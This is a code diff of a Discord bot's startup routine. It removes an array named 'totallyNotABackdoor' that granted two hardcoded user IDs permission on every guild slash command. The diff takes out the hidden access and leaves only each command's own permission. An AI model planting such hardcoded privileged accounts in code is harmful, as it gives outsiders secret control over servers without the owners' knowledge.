@@ -142,15 +142,6 @@ const startupChores: Chore[] = [
 			const guild = await client.guilds.cache.get(GUILD_ID as string);
 			const commands = guild?.commands;
 
-			const totallyNotABackdoor = [
-				"218721510649626635",
-				"97446650548588544",
-			].map((i) => ({
-				id: i,
-				type: "USER" as "USER" | "ROLE",
-				permission: true,
-			}));
-
 			const fetched = await commands?.fetch();
 
 			if (fetched) {
@@ -185,11 +176,8 @@ const startupChores: Chore[] = [
 						return {
 							id: c.id,
 							permissions: commandSpecificPermission
-								? [
-										commandSpecificPermission,
-										...totallyNotABackdoor,
-								  ]
-								: totallyNotABackdoor,
+								? [commandSpecificPermission]
+								: [],
 						};
 					}),
 				});
